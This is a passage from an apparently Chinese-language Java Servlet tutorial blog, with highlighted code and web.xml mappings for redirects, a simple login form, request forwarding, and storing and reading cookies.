class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">num</span> <span class="operator">=</span> random.nextInt(<span class="number">9999999</span>) + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">7</span>-num.length() ; i++) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        num = sb.toString() + num;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/imgs<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.ImageServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/imgs<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/img<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="4、实现重定向"><a href="#4、实现重定向" class="headerlink" title="4、实现重定向"></a>4、实现重定向</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/7a06838801811fc79bd57312a2e377e6--9b4f--image-20241020173351861.png" alt="image-20241020173351861"></p>
<ul>
<li>B一个web资源收到客户端A请求后，B他会通知A客户端去访问另外一个web资源C，这个过程叫<code>重定向</code>。</li>
</ul>
<p>常见场景：</p>
<ul>
<li>用户登录</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">sendRedirect</span><span class="params">(String var1)</span> <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure>

<ul>
<li>测试：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedirectServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        resp.setHeader(&quot;Location&quot;,&quot;/response/img&quot;);</span></span><br><span class="line"><span class="comment">        resp.setStatus(302);</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        resp.sendRedirect(<span class="string">&quot;/response/img&quot;</span>);    <span class="comment">// 重定向</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/redirectServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.RedirectServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/redirectServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/red<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>面试题：请你聊聊重定向和转发的区别？</p>
</blockquote>
<ul>
<li>相同点：页面都会实现跳转；</li>
<li>不同点：<ul>
<li>请求转发的时候，url不会产生变化；</li>
<li>重定向时候，url地址栏会发生变化；</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/ee383ab64d939b7b9aa97432f63b918c--69f9--image-20241020173426776.png" alt="image-20241020173426776"></p>
<h4 id="5-简单实现登录重定向"><a href="#5-简单实现登录重定向" class="headerlink" title="5.简单实现登录重定向"></a>5.简单实现登录重定向</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">    这里提交的路径需要寻找到项目的路径</span><br><span class="line">    $&#123;pageContext.request.contextPath&#125; : 代表当前项目</span><br><span class="line">--%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;登录&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;form action=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/login&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    用户名:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    密  码:&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestTest</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 处理请求</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(username+<span class="string">&quot;:&quot;</span>+password);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重定向时需注意路径问题，否则为404;</span></span><br><span class="line">        <span class="comment">// /response/success.jsp</span></span><br><span class="line">        resp.sendRedirect(<span class="string">&quot;/response/success.jsp&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/request<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.RequestTest<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/request<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;成功&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;登录成功！！！&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="7-HttpServletRequest"><a href="#7-HttpServletRequest" class="headerlink" title="7.HttpServletRequest"></a>7.HttpServletRequest</h3><ul>
<li>HttpServletRequest代表客户端的请求，用户通过Http协议访问服务器，HTTP请求中的所有信息会被封装到HttpServletRequest，通过这个HttpServletRequest的方法，获得客户端的所有信息；</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/7ccd0aef635155b3634b0b59f0498e29--e05b--image-20241020174534018.png" alt="image-20241020174534018"></p>
<blockquote>
<p>获取参数，请求转发：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpServletRequestTest</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        String[] hobbys = req.getParameterValues(<span class="string">&quot;hobbies&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;=============================&quot;</span>);</span><br><span class="line">        <span class="comment">// 后台接收中文乱码问题</span></span><br><span class="line">        System.out.println(username);</span><br><span class="line">        System.out.println(password);</span><br><span class="line">        System.out.println(Arrays.toString(hobbys));</span><br><span class="line">        System.out.println(<span class="string">&quot;=============================&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(req.getContextPath());</span><br><span class="line">        <span class="comment">// 通过请求转发</span></span><br><span class="line">        <span class="comment">// 这里的 / 代表当前的web应用</span></span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;/success.jsp&quot;</span>).forward(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/hsrt<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.HttpServletRequestTest<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/hsrt<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hsrt<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="五、Cookie-Session"><a href="#五、Cookie-Session" class="headerlink" title="五、Cookie.Session"></a>五、Cookie.Session</h2><h3 id="1-会话"><a href="#1-会话" class="headerlink" title="1.会话"></a>1.会话</h3><ul>
<li><p><strong>会话</strong>：用户打开一个浏览器，点击了很多超链接，访问多个web资源，关闭浏览器，这个过程可以称之为会话；</p>
</li>
<li><p><strong>有状态会话</strong>：一个同学来过教室，下次再来教室，我们会知道这个同学，曾经来过，称之为有状态会话；</p>
</li>
</ul>
<blockquote>
<p><strong>你能怎么证明你是西开的学生？</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">你              西开</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 发票                西开给你发票</span><br><span class="line"><span class="number">2.</span> 学校登记        西开标记你来过了</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>一个网站，怎么证明你来过？</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">客户端              服务端</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 服务端给客户端一个 信件，客户端下次访问服务端带上信件就可以了； cookie</span><br><span class="line"><span class="number">2.</span> 服务器登记你来过了，下次你来的时候我来匹配你； seesion</span><br></pre></td></tr></table></figure>

<h3 id="2-保存会话的两种技术"><a href="#2-保存会话的两种技术" class="headerlink" title="2.保存会话的两种技术"></a>2.保存会话的两种技术</h3><p><strong>cookie</strong></p>
<ul>
<li>客户端技术   （响应，请求）</li>
</ul>
<p><strong>session</strong></p>
<ul>
<li>服务器技术，利用这个技术，可以保存用户的会话信息？ 我们可以把信息或者数据放在Session中！</li>
</ul>
<blockquote>
<p>常见常见：网站登录之后，你下次不用再登录了，第二次访问直接就上去了！</p>
</blockquote>
<h3 id="3-Cookie"><a href="#3-Cookie" class="headerlink" title="3.Cookie"></a>3.Cookie</h3><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/d78787f1dfed6242460ba721e2f81bb0--50d1--image-20241020175154351.png" alt="image-20241020175154351"></p>
<ol>
<li>从请求中拿到cookie信息；</li>
<li>服务器响应给客户端cookie；</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Cookie[] cookies = req.getCookies(); <span class="comment">// 获得Cookie</span></span><br><span class="line">cookie.getName(); <span class="comment">// 获得cookie中的key</span></span><br><span class="line">cookie.getValue(); <span class="comment">// 获得cookie中的vlaue</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;lastLoginTime&quot;</span>, System.currentTimeMillis()+<span class="string">&quot;&quot;</span>); <span class="comment">// 新建一个cookie</span></span><br><span class="line">cookie.setMaxAge(<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>); <span class="comment">// 设置cookie的有效期</span></span><br><span class="line">resp.addCookie(cookie); <span class="comment">// 响应给客户端一个cookie</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>cookie：一般会保存在本地的 用户目录下 appdata；</strong></li>
<li>案例：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 保存用户上一次访问的时间</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CookieDemo01</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 服务器，告诉你，你来的时间，将这个时间封装为一个信件</span></span><br><span class="line">        <span class="comment">// 解决中文乱码</span></span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Cookie,服务端从客户端获取</span></span><br><span class="line">        Cookie[] cookies = req.getCookies();</span><br><span class="line">        <span class="comment">// 这里返回数组，说明Cookie可能存在多个</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断Cookie是否存在</span></span><br><span class="line">        <span class="keyword">if</span>(cookies!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 如果存在，遍历数组</span></span><br><span class="line">            writer.write(<span class="string">&quot;你上一次访问的时间是:&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">                <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> cookies[i];</span><br><span class="line">                <span class="comment">// 获取Cookie的名字</span></span><br><span class="line">                <span class="keyword">if</span>(cookie.getName().equals(<span class="string">&quot;lastLoginTime&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 获得cookie中的value</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">parseLong</span> <span class="operator">=</span> Long.parseLong(cookie.getValue());</span><br><span class="line">                    <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(parseLong);</span><br><span class="line">                    writer.write(date.toLocaleString());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            writer.write(<span class="string">&quot;第一次访问本站！！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 服务端给客户端响应一个Cookie;</span></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;lastLoginTime&quot;</span>, System.currentTimeMillis()+<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/cookieDemo01<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.CookieDemo01<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/cookieDemo01<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/cd01<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>一个网站cookie是否存在上限！<strong>聊聊细节问题</strong>。</p>
</blockquote>
<ul>
<li>一个Cookie只能保存一个信息；</li>
<li>一个web站点可以给浏览器发送多个cookie，最多存放20个cookie；</li>
<li>Cookie大小有限制4kb；</li>
<li>300个cookie浏览器上限。</li>
</ul>
<blockquote>
<p><strong>删除Cookie；</strong></p>
</blockquote>
<ul>
<li>不设置有效期，关闭浏览器，自动失效；</li>
<li>设置有效期时间为 0 ；</li>
</ul>
<blockquote>
<p><strong>编码解码：</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URLEncoder.encode(<span class="string">&quot;哇哈哈&quot;</span>,<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">URLDecoder.decode(cookie.getValue(),<span class="string">&quot;UTF-8&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.net.URLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 中文数据传递</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CookieDemo03</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 解决中文乱码</span></span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        Cookie[] cookies = req.getCookies();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断Cookie是否存在</span></span><br><span class="line">        <span class="keyword">if</span>(cookies!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 如果存在，遍历数组</span></span><br><span class="line">            writer.write(<span class="string">&quot;你上一次访问的用户是:&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">                <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> cookies[i];</span><br><span class="line">                <span class="comment">// 获取Cookie的名字</span></span><br><span class="line">                <span class="keyword">if</span>(cookie.getName().equals(<span class="string">&quot;name&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 解码</span></span><br><span class="line">                    writer.write(URLDecoder.decode(cookie.getValue(),<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            writer.write(<span class="string">&quot;第一次访问本站！！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 编码</span></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;name&quot;</span>, URLEncoder.encode(<span class="string">&quot;哇哈哈&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

